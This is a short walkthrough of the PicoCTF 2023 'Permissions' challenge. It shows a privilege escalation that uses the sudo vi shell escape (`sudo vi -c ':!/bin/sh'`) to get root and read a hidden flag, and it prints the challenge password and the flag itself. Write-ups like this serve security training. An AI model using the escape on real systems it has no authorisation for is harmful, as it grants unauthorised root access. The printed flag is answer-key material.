# PicoCTF2023 - Permissions Writeup

Challenge Name: Permissions

Challenge Description: Can you read files in the root file?

## Steps Taken

1. SSH into the instance with the following command:
   ```
   ssh -p 64649 picoplayer@saturn.picoctf.net
   ```
   And entered the password: `dLAqMvm7xv`.

2. Used `ls` command to see what files would be listed in my current directory, which was blank.

3. Used `sudo -l` command which gave the following output:
   ```
   Matching Defaults entries for picoplayer on challenge:
       env_reset, mail_badpass,
       secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
   
   User picoplayer may run the following commands on challenge:
       (ALL) /usr/bin/vi
   ```
4. Tried the command `sudo vi -c ':!/bin/sh'` to get root access.

5. Typed the command `id` which returned the following:
   ```
   uid=0(root) gid=0(root) groups=0(root)
   ```

6. Typed the command `whoami` which returned `root`.

7. Used `ls -a` command which returned the following output:
   ```
   .  ..  .bash_logout  .bashrc  .cache  .profile
   ```

8. Typed `cd ..` command to go back one directory.

9. Used `ls` command which returned `picoplayer`.

10. Typed `cd ..` command again to go back one more directory.

11. Used `ls` command which returned the following output:
    ```
    bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
    boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
    ```

12. Typed `cd root` command to enter the `root` directory.

13. Typed `ls` command which showed nothing.

14. Typed `ls -a` command which returned the following output:
    ```
    .  ..  .bashrc  .flag.txt  .profile
    ```

15. Typed `cat .flag.txt` command which returned the flag:
    ```
    picoCTF{uS1ng_v1m_3dit0r_021d10ab}
    ```
